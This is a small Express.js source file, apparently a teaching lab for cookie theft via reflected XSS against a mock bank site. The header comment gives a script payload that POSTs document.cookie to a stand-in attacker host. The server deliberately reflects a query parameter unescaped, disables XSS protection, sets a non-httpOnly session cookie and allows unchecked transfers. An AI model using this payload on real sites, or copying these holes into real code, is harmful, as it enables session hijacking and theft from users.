// Cookie exfil via XSS

// Payload - use request bin for a webserver to exfil cookie
// <script>fetch('https://evil.net/', {method: 'POST',mode: 'no-cors',body:document.cookie});</script>

const bodyParser = require("body-parser");
const cookieParser = require("cookie-parser");
const express = require("express");
const { randomBytes } = require("crypto");

const app = express();
app.use(cookieParser());
app.use(bodyParser.urlencoded({ extended: false }));
app.use((req, res, next) => {
  res.set("X-XSS-Protection", "0");
  next();
});

const USERS = {
  alice: "password",
  bob: "hunter2",
};
const BALANCES = {
  alice: 500,
  bob: 100,
};
const SESSIONS = {};

app.get("/", (req, res) => {
  const username = SESSIONS[req.cookies.sessionId];
  const source = req.query.source;

  if (username) {
    res.send(`
      Hi ${username}. Your balance is $${BALANCES[username]}.
      <form method='POST' action='/transfer'>
        Send amount:
        <input name='amount' />
        To user:
        <input name='to' />
        <input type='submit' value='Send' />
      </form>
      <h1>
      ${source ? `Hi ${source} reader` : ""}
      </h1>
    `);
  } else {
    res.send(`
      <h1>
      ${source ? `Hi ${source}` : ""}
      Log in to your bank account:
      </h1>
      <form method='POST' action='/login'>
        Username: <input name='username' />
        Password: <input name='password' type='password' />
        <input type='submit' value='Login' />
        </form>
    `);
  }
});

app.post("/login", (req, res) => {
  const { username, password } = req.body;
  const actualPassword = USERS[username];
  if (req.body.password === actualPassword) {
    const SessionId = randomBytes(16).toString("base64");
    SESSIONS[SessionId] = username;
    res.cookie("sessionId", SessionId); // Weak cookie
    res.redirect("/");
  } else {
    res.send("failed login");
  }
});

app.get("/logout", (req, res) => {
  const sessionId = req.cookies.sessionId;
  delete SESSIONS[sessionId];
  res.clearCookie("sessionId");
  res.redirect("/");
});

app.post("/transfer", (req, res) => {
  const sessionId = req.cookies.sessionId;
  const username = SESSIONS[sessionId];

  if (!username) {
    res.send("fail!");
    return;
  }

  const amount = Number(req.body.amount);
  const to = req.body.to;

  BALANCES[username] -= amount;
  BALANCES[to] += amount;
  res.redirect("/");
});

app.listen(4000);
